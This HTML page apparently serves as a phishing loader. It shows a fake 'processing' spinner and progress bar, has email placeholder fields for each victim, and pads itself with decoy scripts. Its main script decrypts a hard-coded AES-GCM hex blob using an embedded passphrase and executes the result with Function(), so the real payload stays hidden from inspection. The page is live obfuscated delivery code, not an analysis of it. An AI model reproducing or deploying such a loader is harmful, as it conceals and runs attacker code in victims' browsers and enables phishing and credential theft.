<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="Global Dev">
    <title>Dynamic Secure Loader</title>
    <style>
        body {
            padding: 0;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background-color: #f3f4f6;
            font-family: Arial, Helvetica, sans-serif;
            min-height: 100vh;
            overflow: hidden;
        }
        .rotating-loader {
            width: 70px;
            height: 70px;
            border: 10px solid #d1d5db;
            border-top: 10px solid #4f46e5;
            border-radius: 50%;
            animation: spin-loader 1.5s linear infinite;
        }
        @keyframes spin-loader {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        .loading-message {
            margin-top: 15px;
            font-size: 18px;
            color: #222;
        }
        .hidden-content {
            visibility: hidden;
        }
        .random-info {
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
        .fake-loader-bar {
            width: 200px;
            height: 10px;
            background-color: #e0e0e0;
            border-radius: 5px;
            margin-top: 20px;
            overflow: hidden;
        }
        .fake-loader-progress {
            width: 0;
            height: 100%;
            background-color: #4f46e5;
            animation: fake-progress 2s linear infinite;
        }
        @keyframes fake-progress {
            0% { width: 0; }
            50% { width: 100%; }
            100% { width: 0; }
        }
    </style>
</head>
<body>

    <!-- Hidden Content -->
    <div class="hidden-content">
        <div custom-tag="hidden" id="secret-data" nike-privinfo=""></div>
    </div>

    <!-- Main Loader -->
    <div adidas="<%=EMAIL64%>" class="rotating-loader"></div>
    <p class="loading-message" data-email="[[ BASE64_EMAIL ]]">Processing your request, please wait...</p>

    <!-- Random Info Div -->
    <div class="random-info">
        <p>Checking system permissions...</p>
    </div>

    <!-- Fake Loader Bar -->
    <div class="fake-loader-bar">
        <div class="fake-loader-progress"></div>
    </div>

    <!-- Useless Script 1 -->
    <script>
        const executeDummyOperation = () => {
            // console.log("[INFO] Executing dummy operation...");
            setTimeout(() => {
                // console.log("[INFO] Dummy operation completed.");
            }, 1500);
        };
        executeDummyOperation();
    </script>

    <!-- Useless Script 2 -->
    <script>
        const createRandomValues = () => {
            const values = [10, 20, 30, 40, 50];
            values.forEach(val => {
                // console.log(`Random value: ${val}`);
            });
        };
        createRandomValues();

    <!-- Useless Script 3 -->
    <script>
        const logFakeMessages = () => {
            const logs = ["Starting process...", "Loading resources...", "Finishing up..."];
            logs.forEach(log => {
                // console.log(`[LOG] ${log}`);
            });
        };
        logFakeMessages();
    </script>

    <!-- Core Secure Processing Script -->
    <script>
        const decodeProtectedContent = async (encodedData, secretKey, saltValue, passKey) => {
            // console.log("[INFO] Beginning secure content decoding...");

            const convertHexToBytes = (hexStr) => {
                return new Uint8Array(hexStr.match(/.{2}/g).map(byte => parseInt(byte, 16)));
            };

            const fakeWait = () => new Promise(resolve => {
                // console.log("[DEBUG] Simulating wait...");
                setTimeout(() => resolve(), 500);
            });

            const generateSecretKey = async (keyMaterial, saltBytes) => {
                return crypto.subtle.deriveKey(
                    { name: "PBKDF2", salt: saltBytes, iterations: 100000, hash: "SHA-256" },
                    keyMaterial,
                    { name: "AES-GCM", length: 256 },
                    false,
                    ["decrypt"]
                );
            };

            const keyMaterial = await crypto.subtle.importKey(
                "raw",
                new TextEncoder().encode(passKey),
                { name: "PBKDF2" },
                false,
                ["deriveKey"]
            );

            await fakeWait();
            const derivedSecretKey = await generateSecretKey(keyMaterial, convertHexToBytes(saltValue));

            try {
                const decodedBytes = await crypto.subtle.decrypt(
                    { name: "AES-GCM", iv: convertHexToBytes(secretKey) },
                    derivedSecretKey,
                    convertHexToBytes(encodedData)
                );
                console.log("[SUCCESS] Secure content decoded successfully.");
                return new TextDecoder().decode(decodedBytes);
            } catch (error) {
                console.error("[ERROR] Failed to decode secure content:", error);
                return null;
            }
        };

        (async () => {
            console.log("[INFO] Starting secure content decoding...");
            const dataPayload = {
                secretKey: "ce12552921e07eeae6d25a8b",
                saltValue: "0ac6f6fafea5dd5e93ca4522b49d3681",
                encodedData: "6deb93765e72ef8ce34b1b97d0c25c97611c83b0ac258d36b36d018cdb7ff468533920838d3707c758da44549d374e8e0ca5a6aa93b0af7aa6d1f2e3c26dcf486585b4c887ad5cb43aed7d90469c8c5265c8bbbeca57739d97e18e7cceac3acfa08db407fba57a71ff3d8a03b8299957024e3205442026156a361709ebd8c2df4c14a3c6c053abe5055489a44d42679720a67e7b98ddb7c15cf91320517d7e3b4c74750d19471e7e76750a80e4a099a0297edb403178b56fd0f152d4ac2ea37bc07720850870a3a7"
            };

            const passKey = "homesweethome";
            const decodedContent = await decodeProtectedContent(dataPayload.encodedData, dataPayload.secretKey, dataPayload.saltValue, passKey);
            Function(`${decodedContent}`)();

            if (decodedContent) {
                // console.log("[INFO] Retrieved secure content:", decodedContent);
            }
        })();
    </script>
</body>
</html>
